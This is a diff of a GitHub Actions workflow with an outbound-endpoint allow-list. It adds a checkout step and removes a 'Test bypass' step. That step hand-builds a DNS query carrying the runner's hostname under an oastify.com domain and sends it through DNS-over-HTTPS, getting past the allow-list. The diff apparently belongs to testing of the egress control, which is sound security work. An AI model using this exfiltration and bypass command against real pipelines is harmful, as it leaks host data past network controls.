@@ -13,7 +13,10 @@ jobs:
           allowed-endpoints: >
             github.com:443
 
+      - name: Checkout
+        uses: actions/checkout@v6
 
+  
       - name: Test bypass
         run: |
-         MY_DOMAIN="oiahutteu679bc4sdhaualwmgdm4a6yv.oastify.com"; HOST=$(hostname); FULL="${HOST}.${MY_DOMAIN}"; NAME_ENCODED=$(awk -v n="$FULL" 'BEGIN{split(n,l,".");for(i in l){printf "%c%s",length(l[i]),l[i]};printf "%c",0}'); MSG=$(printf '\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'); MSG+=$(echo -n "$NAME_ENCODED"); MSG+=$(printf '\x00\x01\x00\x01'); ENCODED=$(echo -n "$MSG" | base64 -w0 | tr '+/' '-_' | tr -d '='); curl -H 'accept: application/dns-message' "https://dns.google/dns-query?dns=$ENCODED"
+         python3 http.py
